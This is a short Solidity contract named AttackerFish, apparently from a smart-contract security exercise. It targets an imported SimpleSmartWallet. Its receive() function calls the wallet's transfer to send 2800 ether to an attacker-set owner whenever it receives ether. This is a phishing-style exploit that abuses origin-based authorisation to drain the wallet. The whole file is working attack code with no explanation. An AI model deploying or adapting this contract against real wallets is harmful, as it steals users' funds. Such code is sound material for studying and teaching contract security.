// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SimpleSmartWallet} from "./SimpleSmartWallet.sol";

contract AttackerFish {
    SimpleSmartWallet public wallet;
    address public owner;

    constructor(address _wallet, address _owner) {
        wallet = SimpleSmartWallet(_wallet);
        owner = _owner;
    }

    receive() external payable {
        wallet.transfer(payable(owner), 2800 ether);
    }
}
